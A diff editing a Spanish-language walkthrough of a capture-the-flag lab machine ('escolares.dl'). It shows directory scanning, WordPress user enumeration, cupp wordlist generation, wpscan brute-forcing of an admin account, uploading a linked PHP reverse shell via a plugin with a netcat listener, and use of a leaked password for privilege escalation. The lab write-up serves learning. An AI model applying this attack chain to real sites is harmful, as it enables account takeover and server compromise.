@@ -75,13 +75,9 @@ Repetimos el escaneo de directorios en `wordpress`:
 ```bash
 gobuster dir -u escolares.dl/wordpress -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,doc,html,txt,img 
 ```
-Identificamos al usuario luisillo como administrador. Procedemos con un ataque de fuerza bruta para descubrir su contraseña.
-
-Si probamos otra vez , ahora incluso el `gobuster` funciona mejor.
-
 ![image](https://github.com/user-attachments/assets/78af7eab-189b-4cbb-a863-f28a2c2867f6)
 
-Nos encuentra muchas rutas interesantes , pero lo que haremos sera usar wpscan , que esta ella espeficamente para auditar paginas wordpress.
+Identificamos al usuario *luisillo* como administrador. Procedemos con un ataque de fuerza bruta para descubrir su contraseña.
 
 ```bash
 wpscan --url http://escolares.dl/wordpress -e u,cb,vp,vt
@@ -90,16 +86,17 @@ Encontramos el usuario que vimos en la ruta de antes de `profesores.html`, por l
 
 ![image](https://github.com/user-attachments/assets/21a0a639-5334-44e9-9463-f9a831e3f157)
 
-##Fuerza bruta usuario luisillo
+##Fuerza bruta usuario "luisillo".
 
-Antes vimos informacion de ese usuario por lo que podemos generar un diccionario de contraseñas a traves de ese usuario.
+Creamos un diccionario de contraseñas utilizando cupp:
+
 ```bash
 cupp -i 
 ```
 
 ![image](https://github.com/user-attachments/assets/2be2ec8e-6ba4-4e1c-9f98-70fcac195447)
 
-Hacemos el ataque con wpscan al usuario lusillo.
+Ejecutamos el ataque de fuerza bruta con `wpscan`:
 
 ```bash
 wpscan --url http://escolares.dl/wordpress/ -U luisillo -P luisillo.txt
@@ -107,36 +104,26 @@ wpscan --url http://escolares.dl/wordpress/ -U luisillo -P luisillo.txt
 
 ![image](https://github.com/user-attachments/assets/88dc4f7d-c65d-4f7b-bd9a-5d8727a477d7)
 
-Esta es la contraseña que tenemos de ese usuario, ya solo nos queda acceder como su usuario en el panel de administracion.
+Obtenemos la contraseña de *luisillo* y accedemos al panel de administración de WordPress.
 
 ![image](https://github.com/user-attachments/assets/db6e7552-df85-455c-b8b9-19222b622268)
 
-Ya dentro nos vamos al apartado de plugins, vemos un plugin el cual tiene acceso a los archivo del servidor web por lo que tenemos que hacer es generar una reverse shell, y acceder desde ella.
 
 ## Reverse Shell
 
-Generamos la reverseshell utilizando **Pentest Monkey**, una herramienta popular para crear shells PHP que nos permiten obtener acceso remoto al servidor. La ruta de la reverseshell es la siguiente:
+Dentro del panel de administración, utilizamos un plugin que permite acceder a los archivos del servidor web. Subimos una reverse shell creada con *Pentest Monkey*:
 
 [Reverseshell de Pentest Monkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
 
-## Pasos para Cargar la Reverseshell
-
-1. **Preparar la Reverseshell**: Creamos un archivo de reverseshell en el directorio `wordpress`, con la ayuda del plugin.
-2. **Ejecutar la Reverseshell**: Una vez que el archivo esté en el servidor, lo ejecutaremos para establecer la conexión.
-
-![image](https://github.com/user-attachments/assets/58b7b91a-e2a4-47f5-86e8-b15b8c8d2f26)
-
-Nos ponemos a escuchar por netcat en mi caso por el 4444
+Nos ponemos a la escucha con `netcat`:
 
 ```bash 
 nc -lvnp 4444
 ```
 
-Luego, accedemos a la ruta de la página web donde hemos cargado la reverseshell:
+![image](https://github.com/user-attachments/assets/58b7b91a-e2a4-47f5-86e8-b15b8c8d2f26)
 
-![image](https://github.com/user-attachments/assets/1ba7e21b-c471-46c7-9873-6a77781a0f9e)
-
-Hacemos un whoami para ver si somos el usuario www-data.
+Accedemos a la URL donde subimos la reverse shell y establecemos la conexión. Verificamos que estamos ejecutando comandos como el usuario `www-data`.
 
 ![image](https://github.com/user-attachments/assets/93cb0367-a3de-4317-ba45-68e930f37faf)
 
@@ -174,11 +161,9 @@ export SHELL=bash
 ```
 # Escalada de Privilegios
 
-Viendo los home pra enumerar mas usuarios encontramos un archivo llamado `secret.txt`.
+Explorando el sistema, encontramos un archivo `secret.txt` en el directorio de *luisillo*. Este archivo contiene la contraseña de su cuenta.
 
 ![image](https://github.com/user-attachments/assets/dfeea024-eb46-4065-ba33-66cf01994575)
-
-Parece que lo contenia era la contraseña del usuario luisillo.
 
 ```bash
 su luisillo
